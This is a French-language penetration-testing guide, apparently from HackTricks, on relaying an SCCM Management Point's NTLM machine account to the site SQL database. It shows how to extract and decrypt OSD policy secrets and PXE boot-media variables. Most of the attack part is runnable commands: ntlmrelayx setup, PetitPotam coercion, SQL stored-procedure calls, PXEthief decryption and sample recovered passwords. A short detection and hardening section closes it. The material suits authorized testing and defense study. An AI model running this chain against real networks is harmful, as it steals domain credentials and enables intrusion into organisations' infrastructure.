# SCCM Management Point NTLM Relay to SQL – Extraction de secrets de politiques OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
En forçant un **System Center Configuration Manager (SCCM) Management Point (MP)** à s'authentifier via SMB/RPC et en **relayant** ce compte machine NTLM vers la **base de données du site (MSSQL)**, vous obtenez les droits `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ces rôles permettent d'appeler un ensemble de procédures stockées qui exposent des blobs de politique de déploiement du système d'exploitation (OSD) (identifiants du Network Access Account, variables de Task-Sequence, etc.). Les blobs sont encodés/chiffrés en hex mais peuvent être décodés et déchiffrés avec **PXEthief**, produisant les secrets en clair.

Chaîne globale :
1. Découvrir le MP et la DB du site ↦ endpoint HTTP non authentifié `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Démarrer `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Contraindre le MP avec **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Via le proxy SOCKS, connectez-vous avec `mssqlclient.py -windows-auth` en tant que compte relayé **<DOMAIN>\\<MP-host>$**.
5. Exécuter :
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ou `MP_GetPolicyBodyAfterAuthorization`)
6. Retirer le BOM `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Des secrets tels que `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. sont récupérés sans toucher PXE ou les clients.

---

## 1. Énumération des endpoints MP non authentifiés
L'extension ISAPI du MP **GetAuth.dll** expose plusieurs paramètres qui ne requièrent pas d'authentification (sauf si le site est PKI-only) :

| Paramètre | Description |
|-----------|-------------|
| `MPKEYINFORMATIONMEDIA` | Renvoie la clé publique du certificat de signature du site + les GUIDs des appareils *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Liste chaque Management-Point du site. |
| `SITESIGNCERT` | Renvoie le certificat de signature du Primary-Site (permet d'identifier le serveur de site sans LDAP). |

Récupérez les GUID qui serviront de **clientID** pour les requêtes DB ultérieures :
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relayer le compte machine du MP vers MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Quand la coercion se déclenche, vous devriez voir quelque chose comme :
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifier les politiques OSD via des procédures stockées
Connectez-vous via le proxy SOCKS (port 1080 par défaut):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Basculer vers la **CM_<SiteCode>** DB (utiliser le code site à 3 chiffres, par ex. `CM_001`).

### 3.1  Trouver les GUIDs Unknown-Computer (optionnel)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lister les stratégies assignées
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Chaque ligne contient `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Concentrez-vous sur les politiques :
* **NAAConfig**  – identifiants du Network Access Account
* **TS_Sequence** – variables de Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Peut contenir des comptes run-as

### 3.3  Récupérer le Body complet
Si vous avez déjà `PolicyID` & `PolicyVersion` vous pouvez ignorer l'exigence du clientID en utilisant :
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT : dans SSMS, augmentez “Maximum Characters Retrieved” (>65535) sinon le blob sera tronqué.

---

## 4. Décoder & déchiffrer le blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Exemple de secrets récupérés :
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Rôles SQL pertinents et procédures
Lors du relay, le login est mappé sur :
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ces rôles exposent des dizaines de permissions EXEC, les principales utilisées dans cette attaque sont :

| Procédure stockée | Objectif |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Liste les politiques appliquées à un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Renvoie le contenu complet de la politique. |
| `MP_GetListOfMPsInSiteOSD` | Renvoyé par le chemin `MPKEYINFORMATIONMEDIA`. |

Vous pouvez consulter la liste complète avec :
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Collecte de médias de démarrage PXE (SharpPXE)
* **PXE reply over UDP/4011** : envoyer une requête de démarrage PXE à un Distribution Point configuré pour PXE. La réponse proxyDHCP révèle des chemins de démarrage tels que `SMSBoot\\x64\\pxe\\variables.dat` (config chiffrée) et `SMSBoot\\x64\\pxe\\boot.bcd`, ainsi qu'un blob de clé chiffrée optionnel.
* **Retrieve boot artifacts via TFTP** : utiliser les chemins retournés pour télécharger `variables.dat` via TFTP (sans authentification). Le fichier est petit (quelques KB) et contient les variables médias chiffrées.
* **Decrypt or crack** :
- Si la réponse inclut la clé de déchiffrement, fournissez-la à **SharpPXE** pour déchiffrer directement `variables.dat`.
- Si aucune clé n'est fournie (médias PXE protégés par un mot de passe personnalisé), SharpPXE émet un hash **compatible Hashcat** `$sccm$aes128$...` pour cracking hors ligne. Après récupération du mot de passe, déchiffrez le fichier.
* **Analyser le XML déchiffré** : les variables en clair contiennent des métadonnées de déploiement SCCM (**Management Point URL**, **Site Code**, GUID des médias, et autres identifiants). SharpPXE les analyse et affiche une commande prête à l'emploi **SharpSCCM** avec les paramètres GUID/PFX/site préremplis pour des abus ultérieurs.
* **Exigences** : seulement la connectivité réseau vers l'écouteur PXE (UDP/4011) et TFTP ; aucun privilège administrateur local n'est nécessaire.

---

## 7. Détection et durcissement
1. **Surveiller les connexions MP** – tout compte ordinateur MP se connectant depuis une IP qui n'est pas son hôte ≈ relay.
2. Activer **Extended Protection for Authentication (EPA)** sur la base de données du site (`PREVENT-14`).
3. Désactiver NTLM inutilisé, appliquer SMB signing, restreindre RPC (mêmes mitigations utilisées contre `PetitPotam`/`PrinterBug`).
4. Durcir la communication MP ↔ DB avec IPSec / mutual-TLS.
5. **Limiter l'exposition PXE** – filtrer UDP/4011 et TFTP aux VLANs de confiance, exiger des mots de passe PXE, et alerter sur les téléchargements TFTP de `SMSBoot\\*\\pxe\\variables.dat`.

---

## Voir aussi
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Références
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
